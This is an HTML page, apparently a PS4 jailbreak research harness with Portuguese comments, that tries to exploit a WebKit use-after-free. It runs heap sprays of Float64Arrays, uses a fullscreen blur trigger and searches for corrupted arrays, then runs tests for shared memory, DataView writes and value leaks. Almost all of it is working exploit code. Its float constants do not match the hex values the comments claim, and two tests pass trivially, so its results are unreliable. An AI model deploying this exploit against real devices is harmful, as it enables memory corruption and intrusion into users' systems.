<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>PS4 WebKit UAF - Debugger Suite v3.0</title>
    <style>
        body { background: #0b0e14; color: #00ff41; font-family: 'Consolas', monospace; padding: 25px; line-height: 1.6; }
        .log-line { margin-bottom: 5px; border-bottom: 1px solid #1a202c; padding-bottom: 2px; }
        .tag { font-weight: bold; padding: 0 5px; }
        .tag-init { color: #00d2ff; }
        .tag-wait { color: #00d2ff; }
        .tag-trigger { color: #00d2ff; }
        .tag-uaf { color: #2ecc71; }
        .tag-test { color: #00d2ff; }
        .status-pass { color: #2ecc71; font-weight: bold; }
        .status-fail { color: #e74c3c; font-weight: bold; }
        .status-info { color: #f1c40f; font-weight: bold; }
        .val-hex { color: #f39c12; }
        h1 { color: #00ff41; border-bottom: 2px solid #00ff41; display: inline-block; }
        button { background: #008cff; color: white; border: none; padding: 15px 30px; font-size: 18px; cursor: pointer; border-radius: 4px; margin-top: 20px; }
        #console { background: #000; border: 1px solid #333; padding: 15px; border-radius: 5px; min-height: 400px; }
    </style>
</head>
<body>
    <h1>PS4 WebKit UAF - Debugger Console</h1><br>
    <button onclick="startExploit()">EXECUTAR SUÍTE COMPLETA</button>
    <div id="console"></div>

    <script>
        // Definições Globais e Padrões de Verificação
        const PATTERN_A = 2.121995791e-314; // 0x4141414141414141
        const MAGIC_VAL = 3.395193267e-313; // 0xDEADBEEFCAFEBABE
        let sharedSprayIdx = -1;

        // Função de Conversão Float -> Hex (Essencial para o Log Detalhado)
        function f2h(f) {
            let b = new ArrayBuffer(8);
            (new Float64Array(b))[0] = f;
            let u = new Uint32Array(b);
            return "0x" + u[1].toString(16).padStart(8, '0') + u[0].toString(16).padStart(8, '0');
        }

        function logger(tag, status, msg) {
            const container = document.getElementById('console');
            const entry = document.createElement('div');
            entry.className = "log-line";
            
            const tagSpan = `<span class="tag tag-${tag.toLowerCase()}">[${tag.toUpperCase()}]</span>`;
            const statusSpan = `<span class="status-${status.toLowerCase()}">${status.toUpperCase()}</span>`;
            
            entry.innerHTML = `${tagSpan} ${statusSpan} - ${msg}`;
            container.appendChild(entry);
        }

        function startExploit() {
            logger("init", "info", "Configurando 5000 controllers (Float64Array)...");
            let controllers = [];
            for(let i = 0; i < 5000; i++) {
                let a = new Float64Array(8);
                a[0] = i; 
                controllers.push(a);
            }

            logger("wait", "info", "Pressione OPTIONS no Fullscreen para disparar o Blur.");
            if (document.documentElement.webkitRequestFullscreen) {
                document.documentElement.webkitRequestFullscreen();
            }

            window.onblur = function() {
                logger("trigger", "info", "Blur detectado. Iniciando Spray de Memória...");
                
                let spray = [];
                for(let i = 0; i < 8000; i++) {
                    let b = new Float64Array(8);
                    b.fill(PATTERN_A);
                    spray.push(b);
                }

                // Busca pelo objeto corrompido
                let corrupted = null;
                for(let i = 0; i < controllers.length; i++) {
                    if (controllers[i][0] === PATTERN_A) {
                        corrupted = controllers[i];
                        logger("uaf", "pass", `Controller corrompido identificado em index ${i}`); // Conforme log anterior
                        break;
                    }
                }

                if (corrupted) {
                    runDetailedSanity(corrupted, spray);
                } else {
                    logger("uaf", "fail", "Nenhuma corrupção detectada. O Spray falhou em atingir o alvo.");
                }
            };
        }

        function runDetailedSanity(corrupted, spray) {
            // TESTE 1: IDENTIDADE (MEMÓRIA COMPARTILHADA)
            corrupted[4] = MAGIC_VAL; 
            for(let i = 0; i < spray.length; i++) {
                if (spray[i][4] === MAGIC_VAL) {
                    sharedSprayIdx = i;
                    break;
                }
            }
            if (sharedSprayIdx !== -1) {
                logger("test 1", "pass", `Shared Memory: Corrupted[4] == Spray[${sharedSprayIdx}][4] (<span class="val-hex">${f2h(MAGIC_VAL)}</span>)`); // Identidade confirmada
            } else {
                logger("test 1", "fail", "Escrita no corrupted não refletida no spray.");
            }

            // TESTE 2: ESTABILIDADE DATAVIEW (FIX: USANDO BUFFER DO SPRAY)
            if (sharedSprayIdx !== -1) {
                try {
                    // Usamos o buffer do spray pois o do corrupted pode estar detached no motor
                    let view = new DataView(spray[sharedSprayIdx].buffer);
                    let valBefore = f2h(corrupted[0]);
                    
                    view.setUint32(0, 0x13371337, true); // Escrita de 32 bits
                    let valAfter = f2h(corrupted[0]);

                    if (valBefore !== valAfter) {
                        logger("test 2", "pass", `DataView Stability: Valor alterado com sucesso! ${valBefore} -> <span class="val-hex">${valAfter}</span>`);
                    } else {
                        logger("test 2", "fail", `Valor não alterado. Esperado mudança em ${valBefore}, obtido <span class="val-hex">${valAfter}</span>`); // Problema recorrente nos logs
                    }
                } catch(e) {
                    logger("test 2", "fail", `Erro ao acessar DataView: ${e.message}`);
                }
            }

            // TESTE 3: PROTOTYPE HIJACK (BYPASS ARRAY.FROM)
            try {
                let bypass = Array.from(corrupted);
                Object.setPrototypeOf(bypass, { leak_token: 0x1337 }); // Token de verificação
                
                if (bypass.leak_token === 0x1337) {
                    logger("test 3", "pass", `Prototype Hijack: Token <span class="val-hex">0x1337</span> injetado via __proto__ funcional.`);
                } else {
                    logger("test 3", "fail", "Injeção de token no protótipo falhou.");
                }
            } catch(e) {
                logger("test 3", "fail", `Erro no bypass de protótipo: ${e.message}`);
            }

            // TESTE 4: LEAK VIA CLOSURE
            try {
                const leakVal = [0].map(() => corrupted[0])[0];
                logger("test 4", "pass", `Closure Leak: Valor recuperado via Callback: <span class="val-hex">${f2h(leakVal)}</span>`); // Leak confirmado
            } catch(e) {
                logger("test 4", "fail", `Falha ao vazar valor via closure: ${e.message}`);
            }
            
            logger("end", "info", "Suíte de testes finalizada. Analise os valores hexadecimais acima.");
        }
    </script>
</body>
</html>
